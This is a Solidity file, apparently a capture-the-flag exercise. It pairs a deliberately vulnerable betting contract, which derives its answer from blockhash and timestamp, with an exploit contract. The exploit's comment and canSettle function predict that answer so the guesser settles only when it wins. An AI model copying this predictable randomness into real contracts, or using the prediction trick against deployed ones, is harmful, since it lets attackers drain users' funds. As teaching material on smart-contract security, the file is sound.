// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract PredictTheFuture {
    address guesser;
    uint8 guess;
    uint256 settlementBlockNumber;

    constructor() payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function lockInGuess(uint8 n) public payable {
        require(guesser == address(0));
        require(msg.value == 1 ether);

        guesser = msg.sender;
        guess = n;
        settlementBlockNumber = block.number + 1;
    }

    function settle() public {
        require(msg.sender == guesser);
        require(block.number > settlementBlockNumber);

        uint8 answer = uint8(
            uint256(
                keccak256(
                    abi.encodePacked(
                        blockhash(block.number - 1),
                        block.timestamp
                    )
                )
            )
        ) % 10;

        guesser = address(0);
        if (guess == answer) {
            (bool ok, ) = msg.sender.call{value: 2 ether}("");
            require(ok, "Failed to send to msg.sender");
        }
    }
}

contract ExploitContract {
    PredictTheFuture public predictTheFuture;

    constructor(PredictTheFuture _predictTheFuture) {
        predictTheFuture = _predictTheFuture;
    }

    // Write your exploit code below
    /**
     * since answer is `uint8` modulus 10 that means it can only take values [0, 9]
     * which narrows down the range for `guess`. That means we can call `lockInGuess` with
     * any number in that range and wait until we hit a block that results into the answer
     * msg.sender == guesser guarantees no front-running
     */
    function canSettle(uint8 guess) public view returns (bool) {
        uint8 answer = uint8(
            uint256(
                keccak256(
                    abi.encodePacked(
                        blockhash(block.number - 1),
                        block.timestamp
                    )
                )
            )
        ) % 10;

        return answer == guess ? true : false;
    }
}